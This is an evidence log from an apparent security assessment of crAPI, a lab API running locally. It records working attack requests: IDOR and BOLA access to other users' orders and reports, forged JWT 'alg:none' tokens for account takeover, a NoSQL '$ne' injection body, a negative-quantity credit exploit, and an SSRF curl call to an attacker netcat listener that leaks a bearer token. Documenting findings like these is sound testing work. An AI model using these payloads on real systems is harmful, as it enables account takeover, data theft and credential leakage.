# Evidence Log — crAPI

Raw request/response evidence per finding. One entry per finding ID, timestamped.
Paste the actual `curl` (or proxy) request and the server response exactly as
observed. Redact tokens to `<ATTACKER_TOKEN>` / `<VICTIM_TOKEN>` where practical,
but keep enough to prove the identity used.

**Conventions:**
- Timestamps in local time, ISO 8601 (`2026-10-20T14:30:00`).
- Label each identity clearly (attacker vs. victim).
- For authorization findings, show both the cross-identity request **and** a
  baseline proving the object belongs to the other account.

---

<!--
## F-00X — <Title>

- **Timestamp:** 2026-10-20T__:__:__
- **Identity used:** attacker
- **Endpoint:** `<METHOD> <path>`

### Request
```http
GET /path HTTP/1.1
Host: localhost:8888
Authorization: Bearer <ATTACKER_TOKEN>
```

### Response
```http
HTTP/1.1 200 OK
Content-Type: application/json

{ ... }
```

### Notes
<Why this response proves the finding. What baseline establishes the object
belongs to the victim?>
-->

## F-001 — IDOR on order details via `order_id`

- **Timestamp:** 2026-10-20T22:30:00
- **Identity used:** attacker (`ram`, `ram123@gmail.com`)
- **Endpoint:** GET `/workshop/api/shop/orders/{id}` (UI route `/orders?order_id=`)

### Baseline — attacker's own order (order_id=6)
UI as `ram`: billed to `ram123@gmail.com`, item Wheel, qty 1, $10.
Screenshot: `evidence/F-001/order6.png`.

### Cross-account access — another user's order (order_id=5)
UI as `ram`: billed to **`admin@example.com`**, phone `9010203040`, item Seat,
qty 2, $20.
Screenshot: `evidence/F-001/order5.png`.

### Raw API request/response
_To add — capture the backend call that the UI route triggers:_
```http
GET /workshop/api/shop/orders/5 HTTP/1.1
Host: localhost:8888
Authorization: Bearer <RAM_TOKEN>
```
```http
HTTP/1.1 200 OK
Content-Type: application/json

(paste trimmed body showing admin@example.com)
```

### Notes
Same `ram` session for both requests. Order 6 confirms ram's baseline; order 5
returns a different account's data → proves object belongs to another user, not
just "reading my own order". Read-only (no modification tested here).

---

## F-002 — IDOR on mechanic service report via `report_id`

- **Timestamp:** 2026-10-20T23:01:00
- **Identity used:** attacker (`ram`, `ram123@gmail.com`)
- **Endpoint:** GET `/workshop/api/mechanic/mechanic_report?report_id={id}` (UI route `/service-report?id=`)

### Baseline — attacker's own report (id=6)
UI as `ram`: Report ID 6, owner `ram123@gmail.com`, VIN `H3JPUM31REF7826CM`,
mechanic `jhon@example.com` / `TRAC_JHN`.
Screenshot: `evidence/F-002/report6.png`.

### Cross-account access — another user's report (id=5)
UI as `ram`: Report ID 5, owner **`adam007@example.com`**, VIN
`7ECOX34KJTV359804`, mechanic `james@example.com` / `TRAC_JME`, phone
`9876895423` (in problem text).
Screenshot: `evidence/F-002/report5.png`.

### Raw API request/response
_To add — capture the backend call that the UI route triggers:_
```http
GET /workshop/api/mechanic/mechanic_report?report_id=5 HTTP/1.1
Host: localhost:8888
Authorization: Bearer <RAM_TOKEN>
```
```http
HTTP/1.1 200 OK
Content-Type: application/json

(paste trimmed body showing adam007@example.com)
```

### Notes
Same `ram` session. Report 6 confirms ram's baseline; report 5 returns another
account's data → cross-user object access. Read-only. Exposed VIN is a chain lead
into `/workshop/api/merchant/service_requests/{VIN}`.

---

## F-003 — JWT `alg:none` auth bypass / account takeover

- **Timestamp:** 2026-10-20T18:27:00 → 2026-10-20T18:48:00
- **Identity used:** attacker (`ram`) forging tokens for arbitrary users
- **Endpoint:** GET `/identity/api/v2/user/dashboard`

### Token structure
- Valid token (captured as `ram`): `alg=RS256`, `sub=ram123@gmail.com`, `role=user`.
  Decoded with `jwt_tool`. Screenshots: `4-token-decoded-rs256.png`,
  `2-valid-vs-forged-token.png`.
- Forged token: header base64 `eyJhbGciOiJub25lIn0` = `{"alg":"none"}`, payload
  with target `sub`, trailing `.` (empty signature). Generated via `jwt_tool -X a`
  and a manual `edit_base64.py`. Screenshots: `3-jwttool-algnone.png`,
  `5-forge-victim-suman.png`.

### Control — forged token for self (sub=ram123@gmail.com)
```http
GET /identity/api/v2/user/dashboard HTTP/1.1
Host: localhost:8888
Authorization: Bearer <FORGED alg:none, sub=ram123@gmail.com>
```
```http
HTTP/1.1 200
Server: openresty/1.27.1.2
Content-Type: application/json

{"id":8,"name":"ram","email":"ram123@gmail.com","number":"1234567890",
 "available_credit":90.0,"role":"ROLE_USER"}
```
Screenshot: `1-forged-ram-200.png`.

### Account takeover — forged token for victim (sub=suman@gmail.com)
```http
GET /identity/api/v2/user/dashboard HTTP/1.1
Host: localhost:8888
Authorization: Bearer <FORGED alg:none, sub=suman@gmail.com>
```
```http
HTTP/1.1 200
Server: openresty/1.27.1.2
Content-Type: application/json

{"id":9,"name":"suman","email":"suman@gmail.com","number":"1234567891",
 "available_credit":100.0,"role":"ROLE_USER"}
```
Screenshots: `6-forged-suman-200.png`, `7-forged-suman-payload.png`.

### Notes
Attacker holds no credentials for suman. An unsigned `alg:none` token with the
victim's email in `sub` returns the victim's account (different `id`, `number`,
`available_credit`) → authentication bypass, not just object access. Target
emails are known/enumerable, so any account is reachable.

---

## F-004 — Unauthorized report download via predictable `filename`

- **Timestamp:** 2026-10-21T02:16:30 (report_6), 2026-10-21T02:16:41 (report_5)
- **Identity used:** attacker (`ram`, valid RS256 token, `sub=ram123@gmail.com`)
- **Endpoint:** GET `/workshop/api/mechanic/download_report?filename={name}`

### Baseline — attacker's own report (report_6)
```http
GET /workshop/api/mechanic/download_report?filename=report_6 HTTP/1.1
Host: localhost:8888
Authorization: Bearer eyJhbGciOiJSUzI1NiJ9...  (ram, RS256, sub=ram123@gmail.com)
```
```http
HTTP/1.1 200 OK
Content-Type: application/octet-stream
Content-Disposition: inline; filename="report_6"

%PDF-1.4 ... (owner ram123@gmail.com, VIN H3JPUM31REF7826CM)
```
Screenshots: `evidence/F-004/1-burp-report6-own.png`, `evidence/F-004/4-pdf-report6-ram.png`.

### Cross-account access — another user's report (report_5)
```http
GET /workshop/api/mechanic/download_report?filename=report_5 HTTP/1.1
Host: localhost:8888
Authorization: Bearer eyJhbGciOiJSUzI1NiJ9...  (SAME ram token)
```
```http
HTTP/1.1 200 OK
Content-Type: application/octet-stream
Content-Disposition: inline; filename="report_5"

%PDF-1.4 ... (owner adam007@example.com, phone 9876895423, VIN 7ECOX34KJTV359804)
```
Screenshots: `evidence/F-004/2-burp-report5-victim.png`, `evidence/F-004/3-pdf-report5-adam.png`.

### Notes
Same ram RS256 token for both. `report_6` is ram's own (baseline); `report_5`
returns adam007's PDF → cross-user object access. Filenames are sequential
(`report_<n>`) so all reports are enumerable. No `../` traversal attempted — this
is BOLA, not path traversal.

---

## F-005 — Negative order quantity increases account credit

- **Timestamp:** 2026-10-21T08:18:21 (before), order POST 08:19:26, 08:21:16 (after)
- **Identity used:** attacker (`ram`)
- **Endpoint:** POST `/workshop/api/shop/orders` (observed via GET `/workshop/api/shop/products`)

### Model (tester)
```
charge     = price × quantity
new_credit = old_credit − charge
quantity = -1, price = 10  →  charge = -10  →  credit - (-10) = credit + 10
```

### Before — credit 100
`GET /workshop/api/shop/products?limit=30&offset=0` → `"credit":100.0`.
Screenshot: `evidence/F-005/1-credit-100-before.png`.

### After the order — credit 110
Order placed (`POST /workshop/api/shop/orders`, HTTP history #1177). Subsequent
`GET /workshop/api/shop/products` → `"credit":110.0`.
Screenshot: `evidence/F-005/2-credit-110-after.png`.

### Notes / gap
Credit increased by exactly 10 after placing an order — anomalous (a purchase
should decrease credit). The order request body (quantity = -1) is NOT in the
captured screenshots; mechanism is inferred from the model + the +10 delta.
TODO: capture `POST /workshop/api/shop/orders` request/response showing the
negative quantity.

---

## F-006 — NoSQL operator injection in coupon validation

- **Timestamp:** 2026-10-21T03:11:10
- **Identity used:** authenticated (`ram`, RS256 token)
- **Endpoint:** POST `/community/api/v2/coupon/validate-coupon`

### Injection request
```http
POST /community/api/v2/coupon/validate-coupon HTTP/1.1
Host: localhost:8888
Authorization: Bearer <RAM_TOKEN>
Content-Type: application/json

{"coupon_code":{"$ne":"x"}}
```
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"coupon_code":"TRAC075","amount":"75","CreatedAt":"2026-10-20T16:16:36.835Z"}
```
Screenshot: `evidence/F-006/1-coupon-ne-injection.png`.

### Notes
An operator object (`$ne`) in place of a string returns a valid coupon → input
is used in the Mongo query without type validation. Proves C:H (coupon disclosure
/ collection enumeration). Integrity (redeeming TRAC075 for credit) not captured
here — attach a redemption request/response to evidence I:H.

---

## F-007 — SSRF via `mechanic_api` + bearer-token leak

- **Timestamp:** 2026-10-21T09:56:00
- **Identity used:** attacker (`ram`, RS256 token)
- **Endpoint:** POST `/workshop/api/merchant/contact_mechanic`

### Attack request
```bash
curl -s -i -X POST http://localhost:8888/workshop/api/merchant/contact_mechanic \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d '{"mechanic_code":"TRAC_JHN","problem_details":"test","vin":"H3JPUM31REF7826CM",
       "mechanic_api":"http://172.17.0.1:9000/ssrf-test",
       "repeat_request_if_failed":false,"number_of_repeats":1}'
```
Screenshot: `evidence/F-007/2-attack-request.png`.

### Server-side callback (attacker listener)
```
$ nc -lvnp 9000
listening on [any] 9000 ...
connect to [172.17.0.1] from (UNKNOWN) [172.19.0.10] 41480
GET /ssrf-test?mechanic_code=TRAC_JHN&problem_details=test&vin=H3JPUM31REF7826CM&mechanic_api=http%3A%2F%2F172.17.0.1%3A9000%2Fssrf-test&... HTTP/1.1
Host: 172.17.0.1:9000
User-Agent: python-requests/2.30.0
Authorization: Bearer eyJhbGciOiJSUzI1NiJ9...   <-- caller token forwarded
```
Screenshot: `evidence/F-007/1-listener-callback.png`.

### Notes
Source `172.19.0.10` is the app container, `python-requests/2.30.0` is the server
HTTP client → the server fetched the attacker URL (non-blind SSRF). The outbound
request carried the `Authorization` bearer token → credential leak to an
attacker-controlled host. Internal-only service access not demonstrated.
